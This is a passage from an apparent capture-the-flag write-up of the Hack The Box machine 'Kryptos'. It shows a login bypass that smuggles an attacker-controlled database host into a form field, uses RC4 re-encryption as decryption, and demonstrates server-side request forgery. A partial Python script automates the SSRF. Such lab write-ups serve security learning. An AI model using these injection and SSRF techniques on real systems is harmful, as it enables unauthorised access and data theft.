Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; use cryptor;
Database changed
MariaDB [cryptor]&gt; show tables;
Empty set (0.001 sec)

MariaDB [cryptor]&gt; 
</code></pre></div></div>
<p>It’s working, <code class="language-plaintext highlighter-rouge">dbuser</code> can login and access <code class="language-plaintext highlighter-rouge">cryptor</code>.<br>
By default the server listens on <code class="language-plaintext highlighter-rouge">localhost</code> only, I changed <code class="language-plaintext highlighter-rouge">bind-address</code> in <code class="language-plaintext highlighter-rouge">/etc/mysql/mariadb.conf.d/50-server.cnf</code> from <code class="language-plaintext highlighter-rouge">127.0.0.1</code> to <code class="language-plaintext highlighter-rouge">0.0.0.0</code> then I restarted the service.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4110/mysqld
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/init
tcp6       0      0 :::111                  :::*                    LISTEN      1/init
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1971/java
</code></pre></div></div>

<h2 id="authentication-bypass-getting-login-query">Authentication Bypass: Getting Login Query</h2>
<p>Now the server will be able to authenticate to the database as <code class="language-plaintext highlighter-rouge">dbuser</code>, however the login query will fail because the database is empty : 
<br>Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Sep 2019 20:29:54 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">966</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>


<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Cryptor Login<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"css/bootstrap.min.css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;h2&gt;</span>Cryptor Login<span class="nt">&lt;/h2&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"Username"</span><span class="nt">&gt;</span>Username:<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"username"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">placeholder=</span><span class="s">"Enter username"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"password"</span><span class="nt">&gt;</span>Password:<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Enter password"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"db"</span> <span class="na">name=</span><span class="s">"db"</span> <span class="na">value=</span><span class="s">"cryptor"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">"1a379390e91abff83331c45c58db799820077653e0c857312c8c64ea34d94028"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary"</span> <span class="na">name=</span><span class="s">"login"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-danger"</span><span class="nt">&gt;</span>
  Nope.<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>I ran <code class="language-plaintext highlighter-rouge">tcpdump</code> on <code class="language-plaintext highlighter-rouge">tun0</code> then I sent the login request again with these credentials : <code class="language-plaintext highlighter-rouge">rick:rick</code></p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

username=rick&amp;password=rick&amp;db=cryptor;host=10.10.xx.xx&amp;token=04621e3945efee9172f45070c43020e6615cccc81d5cc3d69f5e6f93a53321e2&amp;login=
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">tcpdump</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# tcpdump -i tun0 -w cap.pcap
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
^C27 packets captured
27 packets received by filter
0 packets dropped by kernel
root@kali:~/Desktop/HTB/boxes/kryptos# 
</code></pre></div></div>
<p>Then I opened the <code class="language-plaintext highlighter-rouge">pcap</code> file in <code class="language-plaintext highlighter-rouge">wireshark</code> and got the query :
<br><img src="/images/hackthebox/kryptos/4.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'rick'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'891f490e5d7bdb06d90d56f8d7db405f'</span>
</code></pre></div></div>

<h2 id="authentication-bypass-setting-up-the-database">Authentication Bypass: Setting-up the Database</h2>
<p>From the query now we know that we need to create a table called <code class="language-plaintext highlighter-rouge">users</code> with the columns <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">paassword</code>, we also know that the passwords are saved <code class="language-plaintext highlighter-rouge">md5</code> hashed as we saw for the password <code class="language-plaintext highlighter-rouge">rick</code> in the query :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">md5</span><span class="p">(</span><span class="s">"rick"</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="mi">891</span><span class="n">f490e5d7bdb06d90d56f8d7db405f</span>
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>
<p>I created the table <code class="language-plaintext highlighter-rouge">users</code> with the columns <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code> :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kryptos</span><span class="o">#</span> <span class="n">mysql</span>
<span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="k">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="k">g</span><span class="p">.</span>
<span class="n">Your</span> <span class="n">MariaDB</span> <span class="k">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">43</span>
<span class="n">Server</span> <span class="k">version</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">14</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">1</span> <span class="n">Debian</span> <span class="n">buildd</span><span class="o">-</span><span class="n">unstable</span>

<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="k">and</span> <span class="n">others</span><span class="p">.</span>

<span class="k">Type</span> <span class="s1">'help;'</span> <span class="k">or</span> <span class="s1">'</span><span class="se">\h</span><span class="s1">'</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="k">Type</span> <span class="s1">'</span><span class="se">\c</span><span class="s1">'</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="k">current</span> <span class="k">input</span> <span class="k">statement</span><span class="p">.</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">cryptor</span><span class="p">;</span>
<span class="k">Database</span> <span class="n">changed</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">table</span> <span class="n">users</span> <span class="p">(</span> <span class="n">username</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span> <span class="n">password</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span> <span class="p">);</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">409</span> <span class="n">sec</span><span class="p">)</span>
</code></pre></div></div>
<p>Then I inserted my credentials (<code class="language-plaintext highlighter-rouge">rick:rick</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [cryptor]&gt; insert into users ( username, password ) values ( 'rick', '891f490e5d7bdb06d90d56f8d7db405f' );                                                                                                
Query OK, 1 row affected (0.149 sec)
</code></pre></div></div>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-------------------+</span>
<span class="o">|</span> <span class="n">Tables_in_cryptor</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-------------------+</span>
<span class="o">|</span> <span class="n">users</span>             <span class="o">|</span>
<span class="o">+</span><span class="c1">-------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
<span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
<span class="o">|</span> <span class="n">rick</span>     <span class="o">|</span> <span class="mi">891</span><span class="n">f490e5d7bdb06d90d56f8d7db405f</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">103</span> <span class="n">sec</span><span class="p">)</span>
</code></pre></div></div>
<p>Let’s test the query :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'rick'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'891f490e5d7bdb06d90d56f8d7db405f'</span><span class="p">;</span>
<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
<span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
<span class="o">|</span> <span class="n">rick</span>     <span class="o">|</span> <span class="mi">891</span><span class="n">f490e5d7bdb06d90d56f8d7db405f</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">004</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>It’s working.<br>
Now we can simply go to the login page, edit the form input <code class="language-plaintext highlighter-rouge">id</code>  and inject the <code class="language-plaintext highlighter-rouge">host</code> parameter then login with <code class="language-plaintext highlighter-rouge">rick:rick</code>.<br></p>

<p><br><img src="/images/hackthebox/kryptos/5.png" alt="" class="align-center"><br><br></p>

<h2 id="rc4">RC4</h2>
<p>After getting in I got this application which had 2 pages, first one was to encrypt a file :
<br><img src="/images/hackthebox/kryptos/6.png" alt="" class="align-center"><br><br>
Second one was to decrypt a file but it was under construction :
<br><img src="/images/hackthebox/kryptos/7.png" alt="" class="align-center"><br><br>
The encryption page had two encryption methods, <code class="language-plaintext highlighter-rouge">AES-CBC</code> and <code class="language-plaintext highlighter-rouge">RC4</code>, I searched about <code class="language-plaintext highlighter-rouge">RC4</code> and read about it <a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/" target="_blank" rel="noopener noreferrer">here</a>. As the article said, <code class="language-plaintext highlighter-rouge">RC4</code> is a stream cipher and it’s XOR based. The article also gave an example :</p>
<pre><code class="language-pseudocode">RC4 Encryption 
10011000 ? 01010000 = 11001000    

RC4 Decryption 
11001000 ? 01010000 = 10011000
</code></pre>
<p>As you can see, decryption and encryption are the exact same operation, which means that applying the encryption function on encrypted data will eventually decrypt that data if the key is the same used to encrypt it before. In other words, we can use the <code class="language-plaintext highlighter-rouge">RC4</code> encryption option in <code class="language-plaintext highlighter-rouge">encrypt.php</code> to encrypt and decrypt data. Let’s test it.<br>
I created a file called <code class="language-plaintext highlighter-rouge">test.txt</code> with the word <code class="language-plaintext highlighter-rouge">test</code> in it, then I hosted it on a python server :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo test &gt; test.txt
root@kali:~/Desktop/HTB/boxes/kryptos# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre></div></div>
<p>Then I encrypted it :
<br><img src="/images/hackthebox/kryptos/8.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/kryptos/9.png" alt="" class="align-center"><br><br>
It returned a base-64 encoded string, if we try to decode it we will get nothing readable because the data is encrypted :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'LFuc6DA=' | base64 -d 
,[0
</code></pre></div></div>
<p>I decoded it and saved the result in another file and called it <code class="language-plaintext highlighter-rouge">test2.txt</code> then I ran the python server again :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'LFuc6DA=' | base64 -d &gt; test2.txt
root@kali:~/Desktop/HTB/boxes/kryptos# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre></div></div>
<p>I applied the same encryption on the encrypted file :
<br><img src="/images/hackthebox/kryptos/10.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/kryptos/11.png" alt="" class="align-center"><br><br>
And I got the original data decrypted :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'dGVzdAo=' | base64 -d
test
</code></pre></div></div>

<h2 id="ssrf">SSRF</h2>
<p>Great, we can encrypt and decrypt files, but reading our files isn’t really helpful. Earlier during the initial enumeration there was a forbidden directory <code class="language-plaintext highlighter-rouge">/dev</code>. When we provide a url to <code class="language-plaintext highlighter-rouge">/encrypt.php</code> to request a file and encrypt it the requests were made by the server, so I tested for server side request forgery :
<br><img src="/images/hackthebox/kryptos/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/kryptos/13.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM/657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF/RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR/wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQ85wh3RqJuBXLcFBb3HkM1A==' | base64 -d &gt; dev.enc
</code></pre></div></div>
<p><br><img src="/images/hackthebox/kryptos/14.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/kryptos/15.png" alt="" class="align-center"><br><br></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'PGh0bWw+CiAgICA8aGVhZD4KICAgIDwvaGVhZD4KICAgIDxib2R5PgoJPGRpdiBjbGFzcz0ibWVudSI+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwIj5NYWluIFBhZ2U8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9YWJvdXQiPkFib3V0PC9hPgoJICAgIDxhIGhyZWY9ImluZGV4LnBocD92aWV3PXRvZG8iPlRvRG88L2E+Cgk8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d                                                                           
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"menu"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php"</span><span class="nt">&gt;</span>Main Page<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"index.php?view=todo"</span><span class="nt">&gt;</span>ToDo<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
root@kali:~/Desktop/HTB/boxes/kryptos# 
</code></pre></div></div>
<p>It worked.<br>
This process of “encryption –&gt; decoding and saving to a file –&gt; decryption –&gt; decoding” was a lot of steps and doing it manually through burp or the browser wasn’t efficient, so I wrote a script to automate it :
<code class="language-plaintext highlighter-rouge">ssrf.py</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="n">N</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PHPSESSID"</span> <span class="p">:</span> <span class="s">"99ub5git6oc7mka23ibjdorla2"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">'cipher'</span> <span class="p">:</span> <span class="s">'RC4'</span><span class="p">,</span><span class="s">'url'</span> <span class="p">:</span> <span class="n">url</span><span class="p">}</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://kryptos.htb/encrypt.php"</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span>
	<span class="n">start</span> <span class="o">=</span> <span class="s">"id=</span><span class="se">\"</span><span class="s">output</span><span class="se">\"</span><span class="s">&gt;"</span>
	<span class="n">end</span> <span class="o">=</span> <span class="s">"&lt;/textarea&gt;"</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="n">response</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">start</span><span class="p">):</span><span class="n">response</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">end</span><span class="p">)]</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
	<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.xx.xx/"</span> <span class="o">+</span> <span class="n">filename</span> <span class="c1"># replace this with your ip address
</span>	<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">'cipher'</span> <span class="p">:</span> <span class="s">'RC4'</span><span class="p">,</span><span class="s">'url'</span> <span class="p">:</span> <span class="n">url</span><span class="p">}</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://kryptos.htb/encrypt.php"</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span>
	<span class="n">start</span> <span class="o">=</span> <span class="s">"id=</span><span class="se">\"</span><span class="s">output</span><span class="se">\"</span><span class="s">&gt;"</span>
	<span class="n">end</span> <span class="o">=</span> <span class="s">"&lt;/textarea&gt;"</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="n">response</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">start</span><span class="p">):</span><span class="n">response</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">end</span><span class="p">)]</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">create_file</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">N</span>
	<span class="n">filename</span> <span class="o">=</span> <span class="s">"ENCRYPTED_"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
	<span class="n">data</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
		<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
		<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">return</span> <span class="n">filename</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[?] URL : "</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">url</span> <span class="o">==</span> <span class="s">"EXIT"</span> <span class="p">:</span>
		<span class="n">system</span><span class="p">(</span><span class="s">"rm ./ENCRYPTED_* &amp;&amp; rm ./OUTPUT_*"</span><span class="p">)</span>
		<span class="nb">exit</span><span class="p">()</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">create_file</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">url</span><span class="p">)))</span>
	<span class="n">outfile</span> <span class="o">=</span> <span class="s">"OUTPUT_"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
